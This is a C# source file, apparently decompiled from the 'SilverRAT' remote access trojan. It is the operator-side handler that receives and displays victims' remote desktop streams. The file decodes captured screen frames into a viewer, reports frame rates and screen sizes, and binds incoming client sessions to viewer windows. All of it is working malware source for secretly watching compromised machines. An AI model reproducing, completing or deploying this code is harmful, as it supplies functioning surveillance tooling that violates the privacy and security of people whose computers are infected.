using Bunifu.UI.WinForms;
using SilverRAT.Connection;
using SilverRAT.Forms;
using SilverRAT.Helper;
using SilverRAT.MessagePack;
using SilverRAT.StreamLibrary.UnsafeCodecs;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace SilverRAT.Handle_Packet;

internal class HandleRemoteDesktop
{
    public void Connect(Clients client, MsgPack unpack_msgpack)
    {
        try
        {
            switch (unpack_msgpack.ForcePathObject("Command").AsString)
            {
                case "Capture":
                    {
                        RemoteDesktop remoteDesktop2 = (RemoteDesktop)Application.OpenForms["RDP:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (remoteDesktop2 != null)
                        {
                            bool flag = bool.Parse(unpack_msgpack.ForcePathObject("IsActiveWindow").AsString);
                            byte[] asBytes = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
                            lock (remoteDesktop2.syncPicbox)
                            {
                                using (MemoryStream inStream = new MemoryStream(asBytes))
                                {
                                    Bitmap bitmap = (Bitmap)(remoteDesktop2.GetImage = remoteDesktop2.decoder.DecodeData(inStream));
                                    remoteDesktop2.rdSize = bitmap.Size;
                                    if (flag)
                                    {
                                        remoteDesktop2.decoder = new UnsafeStreamCodec(Convert.ToInt32(remoteDesktop2.QualityTrackBar.Value));
                                    }
                                }
                                remoteDesktop2.ViewerBox.Image = remoteDesktop2.GetImage;
                                remoteDesktop2.FPS++;
                                if (remoteDesktop2.sw.ElapsedMilliseconds >= 1000L)
                                {
                                    BunifuLabel logs = remoteDesktop2.logs;
                                    int fPS = remoteDesktop2.FPS;
                                    logs.Text = "FPS: " + fPS + " | Size: " + Methods.BytesToString(asBytes.Length);
                                    remoteDesktop2.FPS = 0;
                                    remoteDesktop2.sw = Stopwatch.StartNew();
                                }
                                break;
                            }
                        }
                        client.Disconnected();
                        break;
                    }
                case "Stop":
                    {
                        RemoteDesktop remoteDesktop3 = (RemoteDesktop)Application.OpenForms["RDP:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (remoteDesktop3 != null)
                        {
                            remoteDesktop3.Power.Enabled = true;
                            remoteDesktop3.Power.Text = "Start";
                            remoteDesktop3.logs.Text = "";
                            remoteDesktop3.WaitRDP.Visible = true;
                            try
                            {
                                if (remoteDesktop3.decoder != null)
                                {
                                    remoteDesktop3.decoder = new UnsafeStreamCodec(remoteDesktop3.QualityTrackBar.Value);
                                }
                                if (remoteDesktop3.ViewerBox.Image != null)
                                {
                                    remoteDesktop3.ViewerBox.Image = null;
                                }
                                break;
                            }
                            catch (Exception ex)
                            {
                                MessageBox.Show(ex.ToString());
                                break;
                            }
                        }
                        client.Disconnected();
                        break;
                    }
                case "Start":
                    {
                        RemoteDesktop remoteDesktop4 = (RemoteDesktop)Application.OpenForms["RDP:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (remoteDesktop4 != null)
                        {
                            remoteDesktop4.WaitRDP.Visible = false;
                            remoteDesktop4.Power.Enabled = true;
                            remoteDesktop4.Power.Text = "Stop";
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
                case "AllScreen":
                    {
                        RemoteDesktop remoteDesktop5 = (RemoteDesktop)Application.OpenForms["RDP:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (remoteDesktop5 != null)
                        {
                            remoteDesktop5.AllScreens.Items.Clear();
                            string asString = unpack_msgpack.ForcePathObject("Message").AsString;
                            string[] array = asString.Split(new string[1] { "-=>" }, StringSplitOptions.None);
                            for (int i = 0; i <= array.Length - 1; i++)
                            {
                                if (array[i].Length > 0)
                                {
                                    remoteDesktop5.AllScreens.Items.Add(array[i]);
                                }
                            }
                            string asString2 = unpack_msgpack.ForcePathObject("X").AsString;
                            string asString3 = unpack_msgpack.ForcePathObject("Y").AsString;
                            remoteDesktop5.ScreenX.Text = asString2;
                            remoteDesktop5.ScreenY.Text = asString3;
                            remoteDesktop5.SizeScreen.Text = asString2 + "x" + asString3;
                            if (remoteDesktop5.AllScreens.Items.Count > 0)
                            {
                                remoteDesktop5.AllScreens.SelectedIndex = 0;
                            }
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
                case "Actived":
                    {
                        RemoteDesktop remoteDesktop = (RemoteDesktop)Application.OpenForms["RDP:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (remoteDesktop != null)
                        {
                            if (remoteDesktop.Client == null)
                            {
                                remoteDesktop.Client = client;
                                remoteDesktop.LoaderConnect.Visible = false;
                                remoteDesktop.Timer1.Start();
                                remoteDesktop.Power.Enabled = true;
                            }
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
            }
        }
        catch
        {
        }
    }
}
